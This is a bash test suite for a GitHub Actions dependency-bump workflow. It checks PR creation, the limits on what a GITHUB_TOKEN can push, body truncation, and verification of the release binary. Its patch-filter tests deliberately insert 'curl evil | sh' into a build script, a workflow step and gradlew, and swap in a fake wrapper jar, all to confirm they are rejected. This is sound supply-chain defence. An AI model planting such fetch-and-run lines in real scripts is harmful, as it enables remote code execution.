#!/usr/bin/env bash
# Blok open-pr z platform-bump.yml, przypadek po przypadku: gałąź, pull request i to, co może wypchnąć GITHUB_TOKEN, oraz
# raport wpływu nad logiem bumpa. Blok jest wycinany między znacznikami i uruchamiany w prawdziwym repozytorium, którego
# origin to lokalne bare repo, z atrapą gh.
set -euo pipefail
root=$(cd "$(dirname "$0")/../.." && pwd)

# --- open-pr ---
# The open-pr block of platform-bump.yml: it commits the applied bump to platform-bump/v<target>, pushes the
# branch and opens a pull request; it does nothing without a diff or when the branch exists, and without a
# bump_token it leaves workflow files alone, because GITHUB_TOKEN may not push them. The block is cut out
# between its markers and run in a real repository whose origin is a local bare repository, with a stub gh.
(
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT

export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1

fail() { local message="$1"; echo "FAIL: $message" >&2; echo "--- output ---" >&2; echo "$OUT" >&2; exit 1; }

awk '
  index($0, "# >>> open-pr") { inside = 1; next }
  index($0, "# <<< open-pr") { inside = 0 }
  inside
' "$root/.github/workflows/platform-bump.yml" > "$tmp/open-pr.sh"
OUT=""
[[ -s "$tmp/open-pr.sh" ]] || fail 'platform-bump.yml has no open-pr block between its markers'

mkdir -p "$tmp/bin"
cat > "$tmp/bin/gh" <<'GH'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$GH_CALLS"
if [[ "$1 $2" == "pr list" ]]; then printf '%s\n' "${GH_OPEN_PRS:-0}"; exit 0; fi
if [[ "$1 $2" == "pr create" && -n "${GH_CREATE_FAILS:-}" ]]; then echo 'pull request create failed: body is too long' >&2; exit 1; fi
previous=""
for arg in "$@"; do [[ "$previous" == --body-file ]] && cp "$arg" "$GH_BODY"; previous="$arg"; done
echo "https://github.com/owner/repo/pull/1"
GH
chmod +x "$tmp/bin/gh"
printf '==> Release notes from 1.5.31 to 1.6.0:\nCONSUMER ACTION REQUIRED\n' > "$tmp/bump.log"

# seed <name>: a repository with one workflow and a pin, pushed to its bare origin; prints its path.
seed() {
  local work="$tmp/$1"
  git init -q --bare -b main "$work.git"
  git init -q -b main "$work"
  mkdir -p "$work/.github/workflows" "$work/backend"
  printf 'uses: DominikSienkiewicz/Platform/.github/workflows/backend-ci.yml@v1.5.31\n' > "$work/.github/workflows/ci.yml"
  printf 'platformVersion=1.5.31\n' > "$work/backend/gradle.properties"
  git -C "$work" add -A
  git -C "$work" -c user.name=t -c user.email=t@example.invalid commit -q -m initial
  git -C "$work" remote add origin "$work.git"
  git -C "$work" push -q origin main
  printf '%s\n' "$work"
}

bump() {
  local work="$1"
  sed -i.bak 's/1\.5\.31/1.6.0/' "$work/backend/gradle.properties" "$work/.github/workflows/ci.yml"
  rm -f "$work/backend/gradle.properties.bak" "$work/.github/workflows/ci.yml.bak"
}

run() {
  local work="$1" token="$2"
  : > "$tmp/gh-calls"
  RC=0
  OUT=$(cd "$work" && PATH="$tmp/bin:$PATH" GH_CALLS="$tmp/gh-calls" GH_BODY="$tmp/gh-body" RUNNER_TEMP="$tmp" \
    TARGET="${TARGET-1.6.0}" BASE=main BUMP_LOG="${BUMP_LOG:-$tmp/bump.log}" BUMP_REPORT="${BUMP_REPORT:-}" \
    BUMP_TOKEN="$token" PUSH_TOKEN="${token:-github-token}" GH_OPEN_PRS="${GH_OPEN_PRS:-0}" GH_CREATE_FAILS="${GH_CREATE_FAILS:-}" \
    bash "$tmp/open-pr.sh" 2>&1) || RC=$?
}

# (a) a bump with a bump_token: branch pushed with every change, pull request opened against the base
work=$(seed with-token)
bump "$work"
run "$work" pat
[[ $RC -eq 0 ]] || fail "a bump must open a pull request (exit $RC)"
git -C "$work.git" rev-parse --verify -q refs/heads/platform-bump/v1.6.0 > /dev/null || fail 'the bump branch must be pushed'
git -C "$work.git" show platform-bump/v1.6.0:.github/workflows/ci.yml | grep -q '@v1.6.0' || fail 'with a bump_token the workflow refs move too'
grep -q '^pr create --base main --head platform-bump/v1.6.0 --title chore(platform): bump Platform to 1.6.0' "$tmp/gh-calls" \
  || fail "the pull request must target the base with the bump title: $(cat "$tmp/gh-calls")"
grep -q 'CONSUMER ACTION REQUIRED' "$tmp/gh-body" || fail 'the pull request body must carry the bump log'
if grep -q 'GITHUB_TOKEN' <<<"$OUT"; then fail 'no warning about GITHUB_TOKEN when a bump_token is set'; fi

# (b) the branch already has an open pull request: nothing is pushed or opened
work=$(seed open-pr)
bump "$work"
git -C "$work" push -q origin main:refs/heads/platform-bump/v1.6.0
GH_OPEN_PRS=1 run "$work" pat
[[ $RC -eq 0 ]] || fail "an open bump pull request is not an error (exit $RC)"
if grep -q '^pr create' "$tmp/gh-calls"; then fail 'no second pull request for a branch with an open one'; fi
git -C "$work.git" show platform-bump/v1.6.0:backend/gradle.properties | grep -qx 'platformVersion=1.5.31' \
  || fail 'a branch with an open pull request must stay as it is'

# (f) the branch exists without an open pull request (a failed create, or a closed pull request): it is replaced
#     and the pull request opened, so the next run does not stay green doing nothing
work=$(seed orphan)
bump "$work"
git -C "$work" push -q origin main:refs/heads/platform-bump/v1.6.0
run "$work" pat
[[ $RC -eq 0 ]] || fail "an orphan bump branch must be replaced (exit $RC)"
grep -q '^pr create' "$tmp/gh-calls" || fail 'an orphan bump branch must get its pull request'
git -C "$work.git" show platform-bump/v1.6.0:backend/gradle.properties | grep -qx 'platformVersion=1.6.0' \
  || fail 'the orphan branch must carry the new bump'

# (g) the pull request cannot be created: the run fails and leaves no branch behind
work=$(seed create-fails)
bump "$work"
GH_CREATE_FAILS=1 run "$work" pat
[[ $RC -ne 0 ]] || fail 'a failed pull request creation must fail the run'
if git -C "$work.git" rev-parse --verify -q refs/heads/platform-bump/v1.6.0 > /dev/null; then
  fail 'a failed pull request creation must not leave the bump branch on origin'
fi
grep -q '::error::' <<<"$OUT" || fail 'a failed pull request creation must say so as an error'

# (h) a report and a log far above GitHub's 65,536-character body limit: the body is cut with a visible note,
#     keeps the start of the report and the end of the log, and stays valid UTF-8
work=$(seed large)
bump "$work"
{ echo 'REPORT START'; for _ in $(seq 1 2000); do echo '- catalog `libs.something-quite-long-here` 1.0.0 -> 1.0.1 ż'; done; } > "$tmp/large-report.md"
{ for _ in $(seq 1 2000); do echo 'Resolving dependencies of a configuration, a long log line ł'; done; echo 'LOG END'; } > "$tmp/large.log"
BUMP_REPORT="$tmp/large-report.md" BUMP_LOG="$tmp/large.log" run "$work" pat
[[ $RC -eq 0 ]] || fail "a large report must still open a pull request (exit $RC)"
chars=$(LC_ALL=en_US.UTF-8 wc -m < "$tmp/gh-body" | tr -d ' ')
[[ $chars -le 65536 ]] || fail "the pull request body must stay within GitHub's limit, got $chars characters"
grep -q 'REPORT START' "$tmp/gh-body" || fail 'a cut body must keep the start of the report'
grep -q 'LOG END' "$tmp/gh-body" || fail 'a cut body must keep the end of the log'
grep -q 'cut to fit' "$tmp/gh-body" || fail 'a cut body must say what was cut'
iconv -f UTF-8 -t UTF-8 "$tmp/gh-body" > /dev/null || fail 'a cut body must stay valid UTF-8'

# (c) without a bump_token the workflow change is dropped, and the pull request says why
work=$(seed without-token)
bump "$work"
run "$work" ""
[[ $RC -eq 0 ]] || fail "a bump without a bump_token must still open a pull request (exit $RC)"
git -C "$work.git" show platform-bump/v1.6.0:.github/workflows/ci.yml | grep -q '@v1.5.31' || fail 'GITHUB_TOKEN may not push workflow changes'
git -C "$work.git" show platform-bump/v1.6.0:backend/gradle.properties | grep -qx 'platformVersion=1.6.0' || fail 'the pins must still be bumped'
grep -q 'were not moved' "$tmp/gh-body" || fail 'the pull request must say the workflow refs stayed'
grep -q '::warning::.*GITHUB_TOKEN' <<<"$OUT" || fail 'without a bump_token the run must warn that CI does not start'

# (d) nothing changed: no branch, no pull request
work=$(seed unchanged)
run "$work" pat
[[ $RC -eq 0 ]] || fail "an up-to-date repository is not an error (exit $RC)"
[[ ! -s "$tmp/gh-calls" ]] || fail 'no pull request without a diff'
if git -C "$work.git" rev-parse --verify -q refs/heads/platform-bump/v1.6.0 > /dev/null; then fail 'no branch without a diff'; fi

# (e) no target version: refuse
TARGET="" run "$work" pat
[[ $RC -ne 0 ]] || fail 'a run without a target version must fail'

echo 'OK: the bump pull request is opened once, recovers an orphan branch, fits the body limit and respects what GITHUB_TOKEN may push'
)

# --- impact-report ---
# Blok open-pr z platform-bump.yml wkłada raport wpływu z `platform-bump --report` (N-REL-8) do treści pull requesta,
# gdy job bumpa go wytworzył, nad logiem; bez raportu treść jest taka jak dotąd.
(
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
OUT=""
fail() { echo "FAIL: $*" >&2; echo "$OUT" >&2; exit 1; }
awk 'index($0, "# >>> open-pr") { inside = 1; next } index($0, "# <<< open-pr") { inside = 0 } inside' \
  "$root/.github/workflows/platform-bump.yml" > "$tmp/open-pr.sh"
grep -q 'BUMP_REPORT' "$tmp/open-pr.sh" || fail 'the open-pr block must read the report'
grep -q -- '--report=' "$root/.github/workflows/platform-bump.yml" || fail 'the bump job must ask platform-bump for the report'
mkdir -p "$tmp/bin"
printf '#!/usr/bin/env bash\nprevious=""\nfor arg in "$@"; do [[ "$previous" == --body-file ]] && cp "$arg" "$GH_BODY"; previous="$arg"; done\n' > "$tmp/bin/gh"
chmod +x "$tmp/bin/gh"
printf 'bump log\n' > "$tmp/bump.log"
printf '## Platform 1.5.31 → 1.6.0: impact on this repository\n\n### Affects this repo\n\n- catalog `libs.jsoup`\n' > "$tmp/report.md"

# shellcheck disable=SC2329 # wołana niżej, w pętli przez nazwę
attempt() {
  local name=$1 report=$2 work="$tmp/$1"
  git init -q --bare -b main "$work.git"
  git init -q -b main "$work"
  mkdir -p "$work/backend"
  printf 'platformVersion=1.5.31\n' > "$work/backend/gradle.properties"
  git -C "$work" add -A
  git -C "$work" -c user.name=t -c user.email=t@example.invalid commit -q -m initial
  git -C "$work" remote add origin "$work.git"
  git -C "$work" push -q origin main
  printf 'platformVersion=1.6.0\n' > "$work/backend/gradle.properties"
  rm -f "$tmp/gh-body"
  OUT=$(cd "$work" && PATH="$tmp/bin:$PATH" GH_BODY="$tmp/gh-body" RUNNER_TEMP="$tmp" TARGET=1.6.0 BASE=main \
    BUMP_LOG="$tmp/bump.log" BUMP_REPORT="$report" BUMP_TOKEN=pat PUSH_TOKEN=pat bash "$tmp/open-pr.sh" 2>&1) || fail "$name: the block must succeed"
}

attempt with-report "$tmp/report.md"
grep -qF '### Affects this repo' "$tmp/gh-body" || fail 'the body must carry the impact report'
[[ $(grep -n 'Affects this repo' "$tmp/gh-body" | cut -d: -f1) -lt $(grep -n 'bump log' "$tmp/gh-body" | cut -d: -f1) ]] \
  || fail 'the report comes before the log'
attempt without-report "$tmp/absent.md"
grep -qF 'Affects this repo' "$tmp/gh-body" && fail 'without a report the body has none'
echo 'OK: the bump pull request carries the impact report above the bump log'
)

# --- apply-patch ---
# Krok „Apply the bump” nakłada patch z joba, który uruchamia kod zależności, zanim job z PAT-em go wypchnie: przechodzą
# tylko pliki, które platform-bump zmienia, w workflowach tylko referencje Platform, a gradle-wrapper.jar tylko taki,
# jaki Gradle publikuje dla starej albo nowej wersji wrappera. Odrzucony patch kończy krok błędem i nic nie zostaje
# nałożone do wypchnięcia.
(
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
OUT=""
fail() { echo "FAIL: $*" >&2; echo "$OUT" >&2; exit 1; }
awk 'index($0, "# >>> apply-patch") { inside = 1; next } index($0, "# <<< apply-patch") { inside = 0 } inside' \
  "$root/.github/workflows/platform-bump.yml" > "$tmp/apply.sh"
[[ -s "$tmp/apply.sh" ]] || fail 'platform-bump.yml has no apply-patch block between its markers'

sha() { (sha256sum "$1" 2>/dev/null || shasum -a 256 "$1") | awk '{ print $1 }'; }
mkdir -p "$tmp/distributions"
printf 'wrapper jar 9.8.1\n' > "$tmp/jar-old"
printf 'wrapper jar 9.9.0\n' > "$tmp/jar-new"
sha "$tmp/jar-old" > "$tmp/distributions/gradle-9.8.1-wrapper.jar.sha256"
sha "$tmp/jar-new" > "$tmp/distributions/gradle-9.9.0-wrapper.jar.sha256"

git init -q -b main "$tmp/seed"
mkdir -p "$tmp/seed/.github/workflows" "$tmp/seed/backend/gradle/wrapper" "$tmp/seed/scripts"
printf 'jobs:\n  ci:\n    uses: SeniorDeveloper-pl-Dominik-Sienkiewicz/Platform/.github/workflows/backend-ci.yml@v2.1.0\n' \
  > "$tmp/seed/.github/workflows/ci.yml"
printf 'platformVersion=2.1.0\n' > "$tmp/seed/backend/gradle.properties"
printf 'distributionUrl=https\\://services.gradle.org/distributions/gradle-9.8.1-bin.zip\n' \
  > "$tmp/seed/backend/gradle/wrapper/gradle-wrapper.properties"
cp "$tmp/jar-old" "$tmp/seed/backend/gradle/wrapper/gradle-wrapper.jar"
printf '#!/bin/sh\necho gradlew 9.8.1\n' > "$tmp/seed/backend/gradlew"
printf '#!/bin/sh\necho build\n' > "$tmp/seed/scripts/build.sh"
git -C "$tmp/seed" add -A
git -C "$tmp/seed" -c user.name=t -c user.email=t@example.invalid commit -q -m initial

# attempt <name> <change>: <change> runs in a clone of the seed and becomes the patch; the block applies it to another clone.
attempt() {
  local name=$1 change=$2
  git clone -q "$tmp/seed" "$tmp/$name-maker"
  (cd "$tmp/$name-maker" && eval "$change" && git add -A && git diff --cached --binary > "$tmp/$name.patch")
  git clone -q "$tmp/seed" "$tmp/$name"
  RC=0
  OUT=$(cd "$tmp/$name" && PATCH="$tmp/$name.patch" GRADLE_DISTRIBUTIONS_URL="file://$tmp/distributions" bash "$tmp/apply.sh" 2>&1) || RC=$?
  WORK="$tmp/$name"
}
pins='sed -i.bak s/2.1.0/2.2.0/ backend/gradle.properties .github/workflows/ci.yml && rm -f backend/gradle.properties.bak .github/workflows/ci.yml.bak'

# (a) pins, workflow references and lockfiles: applied to the working tree, unstaged, for the open-pr block
attempt pins "$pins && printf 'lock\n' > backend/gradle.lockfile"
[[ $RC -eq 0 ]] || fail "a pin bump must apply (exit $RC)"
grep -qx 'platformVersion=2.2.0' "$WORK/backend/gradle.properties" || fail 'the pins must be applied'
[[ -f "$WORK/backend/gradle.lockfile" ]] || fail 'a new lockfile must be applied'
[[ -z "$(git -C "$WORK" diff --cached --name-only)" ]] || fail 'the applied patch must stay unstaged'

# (b) a file platform-bump never writes: rejected, named in the error
attempt script "$pins && printf 'curl evil | sh\n' >> scripts/build.sh"
[[ $RC -ne 0 ]] || fail 'a patch that changes scripts/build.sh must be rejected'
grep -q '::error::scripts/build.sh is not a file platform-bump changes' <<<"$OUT" || fail 'the rejection must name the file'

# (c) a workflow line other than a Platform reference: rejected
attempt workflow "printf '      - run: curl evil | sh\n' >> .github/workflows/ci.yml"
[[ $RC -ne 0 ]] || fail 'a workflow change beyond the Platform references must be rejected'
grep -q 'not a Platform workflow reference' <<<"$OUT" || fail 'the rejection must name the workflow line'

# (d) the wrapper the bump sets: the jar of the old or the new version passes, any other jar is rejected
wrapper='sed -i.bak s/9.8.1/9.9.0/ backend/gradle/wrapper/gradle-wrapper.properties backend/gradlew && rm -f backend/gradle/wrapper/*.bak backend/gradlew.bak'
attempt wrapper-new "$wrapper && cp '$tmp/jar-new' backend/gradle/wrapper/gradle-wrapper.jar"
[[ $RC -eq 0 ]] || fail "the published jar of the new wrapper version must pass (exit $RC)"
attempt wrapper-swapped "$wrapper && printf 'evil\n' > backend/gradle/wrapper/gradle-wrapper.jar"
[[ $RC -ne 0 ]] || fail 'a wrapper jar Gradle did not publish must be rejected'
grep -q 'gradle-wrapper.jar is not the wrapper jar Gradle publishes' <<<"$OUT" || fail 'the rejection must name the jar'

# (e) gradlew without a new wrapper version: rejected
attempt gradlew "printf 'curl evil | sh\n' >> backend/gradlew"
[[ $RC -ne 0 ]] || fail 'a gradlew change without a wrapper version change must be rejected'

# (f) an empty patch: nothing to apply
attempt empty ":"
[[ $RC -eq 0 ]] || fail "an empty patch is not an error (exit $RC)"
echo 'OK: the bump patch is applied only within what platform-bump changes'
)

# --- start-bin ---
# Krok „Run platform-bump” uruchamia tylko zweryfikowany bin: najnowsze wydanie z GitHub Releases, jego asset versions
# sprawdzony sumą z SHA256SUMS i atestacją release.yml, a nie niesprawdzony tag npm @latest.
(
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT
OUT=""
fail() { echo "FAIL: $*" >&2; echo "$OUT" >&2; exit 1; }
workflow="$root/.github/workflows/platform-bump.yml"
if grep -qE 'npx|versions@latest' "$workflow"; then fail 'the bump must not start the unverified npm tag @latest'; fi
awk 'index($0, "# >>> start-bin") { inside = 1; next } index($0, "# <<< start-bin") { inside = 0 } inside' "$workflow" > "$tmp/start.sh"
[[ -s "$tmp/start.sh" ]] || fail 'platform-bump.yml has no start-bin block between its markers'

mkdir -p "$tmp/bin" "$tmp/releases/v2.3.0" "$tmp/package/package/bin"
cat > "$tmp/bin/gh" <<'GH'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$GH_CALLS"
case "$1 $2" in
  "api repos/SeniorDeveloper-pl-Dominik-Sienkiewicz/Platform/releases/latest") echo v2.3.0 ;;
  "attestation verify") [[ -z "${GH_ATTESTATION_FAILS:-}" ]] || { echo 'no matching attestation' >&2; exit 1; } ;;
  *) exit 1 ;;
esac
GH
chmod +x "$tmp/bin/gh"
printf '{ "name": "versions", "version": "2.3.0" }\n' > "$tmp/package/package/package.json"
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$*" > "$BIN_CALL"\necho "bump ran"\n' > "$tmp/package/package/bin/platform-bump.sh"
asset=seniordeveloper-pl-dominik-sienkiewicz-versions-2.3.0.tgz
tar -czf "$tmp/releases/v2.3.0/$asset" -C "$tmp/package" package
sha() { (sha256sum "$1" 2>/dev/null || shasum -a 256 "$1") | awk '{ print $1 }'; }
printf '%s  %s\n' "$(sha "$tmp/releases/v2.3.0/$asset")" "$asset" > "$tmp/releases/v2.3.0/SHA256SUMS"

run() {
  local name=$1
  mkdir -p "$tmp/$name"
  : > "$tmp/gh-calls"
  rm -f "$tmp/bin-call"
  RC=0
  OUT=$(cd "$tmp" && PATH="$tmp/bin:$PATH" GH_CALLS="$tmp/gh-calls" BIN_CALL="$tmp/bin-call" RUNNER_TEMP="$tmp/$name" \
    PLATFORM_RELEASES_URL="file://$tmp/releases" VERSION="${VERSION:-}" GH_ATTESTATION_FAILS="${GH_ATTESTATION_FAILS:-}" \
    bash "$tmp/start.sh" 2>&1) || RC=$?
}

# (a) the newest release's bin, checked against SHA256SUMS and its attestation, runs with --report
run verified
[[ $RC -eq 0 ]] || fail "a verified bin must run (exit $RC)"
grep -qF "attestation verify $tmp/verified/platform-cli/$asset --repo SeniorDeveloper-pl-Dominik-Sienkiewicz/Platform --source-ref refs/tags/v2.3.0 --signer-workflow SeniorDeveloper-pl-Dominik-Sienkiewicz/Platform/.github/workflows/release.yml" "$tmp/gh-calls" \
  || fail "the asset must be verified against Platform's release.yml at its tag: $(cat "$tmp/gh-calls")"
grep -qx -- "--report=$tmp/verified/platform-bump-report.md" "$tmp/bin-call" || fail "the bin must run with --report only: $(cat "$tmp/bin-call" 2>/dev/null)"
grep -qx 'bump ran' "$tmp/verified/platform-bump.log" || fail 'the bin output must reach the bump log'

# (b) an explicit version goes to the bin, which hands over to that release itself
VERSION=2.2.0 run explicit
grep -qx -- "2.2.0 --report=$tmp/explicit/platform-bump-report.md" "$tmp/bin-call" || fail "the version input must reach the bin: $(cat "$tmp/bin-call" 2>/dev/null)"

# (c) an attestation that does not verify: the bin never runs
GH_ATTESTATION_FAILS=1 run unattested
[[ $RC -ne 0 ]] || fail 'an asset without a valid attestation must stop the run'
[[ ! -f "$tmp/bin-call" ]] || fail 'an unattested bin must not run'

# (d) an asset that does not match SHA256SUMS: the bin never runs
printf '%064d  %s\n' 0 "$asset" > "$tmp/releases/v2.3.0/SHA256SUMS"
run mismatch
[[ $RC -ne 0 ]] || fail 'an asset that does not match SHA256SUMS must stop the run'
[[ ! -f "$tmp/bin-call" ]] || fail 'a bin that does not match SHA256SUMS must not run'
grep -q '::error::.*SHA256SUMS' <<<"$OUT" || fail 'the mismatch must be reported as an error'
echo 'OK: the bump starts only the verified bin of the newest release'
)
